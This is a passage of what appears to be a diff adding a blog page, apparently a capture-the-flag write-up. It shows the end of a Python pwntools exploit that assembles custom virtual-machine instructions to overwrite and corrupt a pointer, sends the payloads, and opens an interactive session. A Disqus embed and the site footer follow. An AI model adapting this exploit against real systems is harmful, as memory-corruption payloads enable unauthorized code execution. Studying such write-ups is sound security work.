+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff7b72;font-weight:bold">+=</span> _ill()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>send(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">######################## overwrite ptr </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _jmp(<span style="color:#a5d6ff">0x2</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x8</span>)
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># user data</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16((<span style="color:#a5d6ff">1</span> <span style="color:#ff7b72;font-weight:bold">&lt;&lt;</span> <span style="color:#a5d6ff">12</span>) <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#a5d6ff">1</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;A</span><span style="color:#79c0ff">\xe8</span><span style="color:#a5d6ff">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x6</span>) <span style="color:#8b949e;font-style:italic"># 0x8</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x4</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">######################## padding and jump after move backward</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">16</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">######################## set length and corrupt ptr</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _jmp(<span style="color:#a5d6ff">0x12</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x1c</span>)
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># user data</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0xfe8</span>) <span style="color:#8b949e;font-style:italic"># 0x14</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x8000</span>) <span style="color:#8b949e;font-style:italic"># 0x16</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0xfe1</span>) <span style="color:#8b949e;font-style:italic"># 0x18</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p16(<span style="color:#a5d6ff">0x10</span>) <span style="color:#8b949e;font-style:italic"># 0x1a</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x16</span>) <span style="color:#8b949e;font-style:italic"># 0x1c</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x14</span>) 
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _ldc(<span style="color:#a5d6ff">0x18</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _ldi()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _sbc(<span style="color:#a5d6ff">0x1a</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _tat()
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _lda(<span style="color:#a5d6ff">0x18</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> _stt()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">while</span>(len(payload) <span style="color:#ff7b72;font-weight:bold">&lt;</span> (<span style="color:#a5d6ff">1</span> <span style="color:#ff7b72;font-weight:bold">&lt;&lt;</span> <span style="color:#a5d6ff">12</span>)):
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff7b72;font-weight:bold">+=</span> _ill()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>send(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>interactive()
+</span></span></code></pre></div>
+      </div>
+
+
+      <footer>
+        
+
+
+        <div id="disqus_thread"></div>
+<script>
+  window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "yourdiscussshortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+    
+    document.addEventListener('themeChanged', function (e) { 
+        if (document.readyState == 'complete') {
+          DISQUS.reset({ reload: true, config: disqus_config });
+        }
+    });
+</script>
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2026
+     bitfriends 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.js"></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
